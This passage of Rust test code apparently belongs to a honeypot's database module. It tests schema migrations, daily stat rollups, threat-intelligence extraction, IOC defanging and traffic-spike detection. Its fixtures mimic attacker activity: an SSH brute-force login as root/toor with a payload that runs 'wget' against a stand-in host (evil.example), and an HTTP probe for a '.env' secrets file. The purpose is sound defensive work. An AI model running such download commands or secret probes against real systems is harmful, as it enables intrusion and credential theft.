        sqlx::query(
            "CREATE TABLE requests (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp BIGINT NOT NULL, ip TEXT NOT NULL, country_code TEXT, latitude REAL, longitude REAL, service TEXT NOT NULL, port INTEGER, request TEXT, payload TEXT, http_path TEXT, username TEXT, password TEXT, user_agent TEXT, request_size INTEGER DEFAULT 0)"
        ).execute(&db.pool).await.unwrap();
        sqlx::query(
            "CREATE TABLE stats_daily (day_bucket INTEGER PRIMARY KEY, total_requests INTEGER NOT NULL DEFAULT 0, country_counts TEXT, service_counts TEXT, path_counts TEXT, credential_counts TEXT, location_counts TEXT, total_bytes INTEGER DEFAULT 0, ip_request_counts TEXT, ip_bytes_counts TEXT)"
        ).execute(&db.pool).await.unwrap();
        sqlx::query("CREATE INDEX idx_credentials ON requests(username, id DESC) WHERE username IS NOT NULL")
            .execute(&db.pool)
            .await
            .unwrap();

        // Run migrations twice to verify idempotency
        db.run_migrations().await.unwrap();
        db.run_migrations().await.unwrap();

        let legacy_indexes: Vec<(String,)> = sqlx::query_as(
            "SELECT name FROM sqlite_master WHERE type = 'index' AND name = 'idx_credentials'",
        )
        .fetch_all(&db.pool)
        .await
        .unwrap();
        assert!(legacy_indexes.is_empty());

        let _ = std::fs::remove_file(&path);
        let _ = std::fs::remove_file(format!("{}-wal", path.display()));
        let _ = std::fs::remove_file(format!("{}-shm", path.display()));
    }

    #[tokio::test]
    async fn test_hybrid_stats_timeseries_spikes_and_intelligence() {
        let tmp = setup_temp_db().await;
        let db = &tmp.db;

        let now = Utc::now();
        let today_start = utc_today_start(now);
        let yesterday = today_start - DAY_MS;

        let mut ev_old = AttackEvent::new("5.5.5.5".into(), "ssh".into(), 22, "SSH login".into())
            .with_credentials("root".into(), "toor".into())
            .with_payload(b"uname -a\nwget http://evil.example/a.sh".to_vec())
            .with_user_agent("SSH-2.0-libssh".into())
            .with_tag("ssh-bruteforce")
            .with_iocs(vec![IocItem {
                ioc_type: "url".into(),
                value: "http://evil.example/a.sh".into(),
                context: None,
            }]);
        ev_old.timestamp = DateTime::from_timestamp_millis(yesterday + 3600_000).unwrap();
        ev_old.asn = Some(14061);
        ev_old.asn_org = Some("DigitalOcean, LLC".into());

        let ev_today = AttackEvent::new("6.6.6.6".into(), "http".into(), 80, "GET /.env".into())
            .with_tag("secret-probe")
            .with_tag("canary-triggered");

        db.batch_insert_events(&[ev_old, ev_today]).await.unwrap();
        db.aggregate_day(yesterday).await.unwrap();

        let stats_7d = db.get_stats_hybrid(168).await.unwrap();
        assert_eq!(stats_7d.total, 2, "must include yesterday rollup + today live");

        let intel = db.get_intelligence(168).await.unwrap();
        assert!(intel.tags.iter().any(|t| t.name == "secret-probe"));
        assert!(intel.tags.iter().any(|t| t.name == "ssh-bruteforce"));
        assert!(intel.commands.iter().any(|c| c.name == "uname -a"));
        assert!(intel.asns.iter().any(|a| a.name.contains("14061")));
        assert_eq!(intel.recent_iocs.len(), 1);
        assert!(intel.recent_iocs[0].defanged.starts_with("hxxp://"));

        // Spike detection unit check
        let mut pts = vec![10, 12, 9, 11, 100]
            .into_iter()
            .enumerate()
            .map(|(i, total)| TimeSeriesPoint {
                timestamp: i as i64,
                label: format!("{}", i),
                total,
                services: HashMap::new(),
                is_spike: false,
                baseline: 0.0,
                multiplier: 0.0,
                partial: false,
            })
            .collect::<Vec<_>>();
        let summary = annotate_spikes(&mut pts);
        assert_eq!(summary.count, 1);
        assert!(pts[4].is_spike);
        assert_eq!(summary.peak_total, 100);
    }
}
